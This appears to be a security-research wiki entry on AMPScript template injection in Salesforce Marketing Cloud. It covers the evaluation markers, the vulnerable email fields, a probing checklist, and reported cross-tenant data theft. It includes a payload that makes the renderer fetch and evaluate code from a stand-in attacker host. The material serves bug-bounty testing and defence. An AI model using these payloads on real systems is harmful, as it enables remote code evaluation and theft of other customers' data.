---
title: AMPScript Template Injection (Salesforce Marketing Cloud)
slug: ampscript-template-injection
created_utc: 2026-05-15T00:00:00Z
updated_utc: 2026-05-15T00:00:00Z
tags: [technique/server-side, technique/template-injection, target/salesforce]
inbound: []
---

# AMPScript Template Injection (SFDC Marketing Cloud)

## What this is

AMPScript is a server-side template language **specific to Salesforce
Marketing Cloud (SFDC)**. Any user-influenced field in an outbound email
is a template-injection candidate when the renderer evaluates AMPScript
twice (double evaluation).

## Triggers / payload markers

Two evaluation markers; both fire AMPScript:

```
%%=  ...expression...  =%%
{{=  ...expression...  =}}
```

**Add both forms to template-injection payload sets.** The
curly-brace form is the lesser-known variant and slips through filters
that only match `%%=`.

## Insertion points

Anywhere user-influenced text reaches an outbound email subject or body
that the SFDC engine re-evaluates. Confirmed historically in:

- email **subject line** (Searchlight Cyber writeup, Ep. 174)
- **first-name** profile field rendered into the email body
- any merge field rendered by the engine

## Foot gun #1 — "treat as content"

The `TreatAsContent()` function takes a string and re-evaluates it as
AMPScript. Combined with `HTTPGet()` this gives a **chained injection**
that bypasses tight length limits at the original insertion point.

Pattern (~50 characters at the insertion point):

```
%%=TreatAsContent(HTTPGet("https://attacker.example/payload.amp"))=%%
```

The attacker hosts arbitrary AMPScript at the URL, and the renderer
fetches and evaluates it inline. Use this whenever the primary
injection point caps you at ~60–80 characters.

## Decryption / data-extraction lift

Once template injection works, the same engine often has access to
internal crypto primitives and DB-resident customer data. The
Searchlight writeup chained AMPScript injection with a CBC IV-recovery
attack on a sibling encryption parameter to read other tenants' email
content — see [[cbc-iv-recovery-null-block]].

## Seen in the wild

- **2026-05 — Salesforce Marketing Cloud, "Ghosts of Encryption Past"
  (Searchlight Cyber)** — double-evaluation in subject line + first-name
  field; attacker-hosted AMPScript chain via `TreatAsContent`+`HTTPGet`;
  exfiltrated other tenants' emails. Source:
  [CT Ep. 174](wiki://podcasts/ct/20260514_qi4dGzjDPI8_Saving_Bug_Bounty_Programs_+_AMPScript_tessl_GPT-5.5_Ep._174).
- **~2025 — undisclosed SFDC tenant** — Justin Gardner + Evan Conley +
  Chubbs found the same `TreatAsContent`+`HTTPGet` chain; payload hosted
  on Chubbs' `.gg` server. Same source.

## Detection / hunting checklist

- Send `%%=1+1=%%` and `{{=1+1=}}` in every field that ends up in an
  outbound email (subject, name, opt-in confirmation page, password
  reset).
- Look for `2` in the rendered output → confirms eval.
- If insertion point is short, jump straight to the `TreatAsContent` +
  `HTTPGet` chain.
- Watch for differences between the in-browser preview (`view in
  browser` button) and the actual delivered email — the URL behind that
  button may carry encrypted email-id parameters worth attacking
  separately (see [[cbc-iv-recovery-null-block]]).

## Related

- [[cbc-iv-recovery-null-block]] — IV recovery primitive paired with this
  in the SFDC chain
- [[../dom-xss/client-side-template-injection]] — related class
  client-side
